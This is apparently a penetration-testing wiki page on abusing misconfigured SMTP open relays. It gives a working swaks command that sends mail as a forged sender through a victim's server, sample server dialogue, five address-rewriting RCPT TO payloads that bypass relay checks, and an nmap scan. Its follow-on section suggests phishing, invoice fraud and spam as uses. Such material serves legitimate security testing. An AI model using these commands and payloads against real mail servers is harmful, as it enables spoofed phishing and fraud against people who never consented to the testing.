---
title: "Open relay: sending mail as anyone through a misconfigured MTA"
description: "An open relay accepts mail from an external sender addressed to an external recipient and forwards it, letting an attacker send spoofed mail as any address through the victim's server. Partial-relay tricks (source routing, percent-hack, quoting, bang paths) defeat servers that only block the naive case."
keywords:
  - open relay
  - smtp relay
  - swaks
  - mail spoofing
  - relay access denied
---

# Open relay

A mail server should relay mail only for its own domains or authenticated clients. An open relay fails that check: it accepts `MAIL FROM` from an address it does not own and `RCPT TO` for a recipient it does not serve, then delivers it. That turns the server into a free, reputation-carrying spoofing engine: you connect, claim to be anyone, address anyone, and the server sends it. The test is simply whether both the external sender and the external recipient are accepted and the message is queued. Servers that block the obvious external-to-external case often still relay when the destination is hidden inside a legacy address form, so a "closed" relay must be retested with those forms before you believe it.

## Preconditions

- Port 25 reachable (relay testing is an MTA-to-MTA concern; submission on 587 requires AUTH and is not "open relay" in this sense).
- A mailbox you control off the victim's domains to receive the proof message (any external address, e.g. a burner Gmail).
- No credential needed: an open relay is open precisely because it does not ask for one.

## Worked test

```bash
# swaks makes the whole transaction and prints every line of the dialogue
swaks --server mail.victim.com --to proof@gmail.com --from ceo@othercorp.com
```
Read the server's response to `RCPT TO` and the final `DATA` result:

```text
<~  250 2.1.0 <ceo@othercorp.com>: Sender address accepted
 ~> RCPT TO:<proof@gmail.com>
<~  250 2.1.5 <proof@gmail.com>: Recipient address accepted   # external->external accepted
...
<~  250 2.0.0 Ok: queued as 4F2a...                           # RELAY IS OPEN
```
vs a closed relay:
```text
<~  554 5.7.1 <proof@gmail.com>: Relay access denied          # refuses to relay
```

`250 ... queued` on an external-to-external message means mail left the box as your forged sender. `554 Relay access denied` (or `550`) means the naive path is closed, so move to the partial-relay forms.

## Partial-relay forms

Legacy address rewriting makes a destination look local to the relay check while still routing externally. Test each when the direct form is denied:

```text
RCPT TO:<proof@gmail.com@mail.victim.com>     # source route: delivered on to gmail.com
RCPT TO:<proof%gmail.com@mail.victim.com>     # percent hack: % rewritten to @ on relay
RCPT TO:<"proof@gmail.com"@mail.victim.com>   # quoted local part smuggles the real target
RCPT TO:<@mail.victim.com:proof@gmail.com>    # RFC source-route syntax
RCPT TO:<mail.victim.com!proof@gmail.com>     # UUCP bang path
```
A `250` on any of these is a working relay through that rewrite. Nmap drives all of these for you:

```bash
nmap -p25 --script smtp-open-relay -v mail.victim.com
# smtp-open-relay: Server is an open relay (3/16 tests)   <- which of 16 variants passed
```
Read the fraction: `0/16` is closed, any non-zero count names a usable form (the verbose output lists which test strings were accepted).

## Follow-on

- Send spoofed mail as any sender the target trusts: internal-looking `From:` for phishing, vendor addresses for invoice fraud. Delivery still faces the recipient's SPF/DKIM/DMARC, so the relay is most potent when it relays *for* a domain it is authorized to send for.
- Mass delivery (spam) rides the server's IP reputation.
- Pair with [user enumeration](user-enumeration.md) to address real internal recipients, and compare with [SMTP smuggling](smtp-smuggling.md) when you need the spoof to pass DMARC rather than just reach the inbox.

## Tools

- [swaks](https://github.com/jetmore/swaks)
- [Nmap smtp-open-relay](https://nmap.org/nsedoc/scripts/smtp-open-relay.html)

## References

- [RFC 5321 section 3.6.1 (source routes)](https://datatracker.ietf.org/doc/html/rfc5321#section-3.6.1)
- [swaks documentation](https://www.jetmore.org/john/code/swaks/latest/doc/ref.txt)
- [HackTricks: open relay](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)
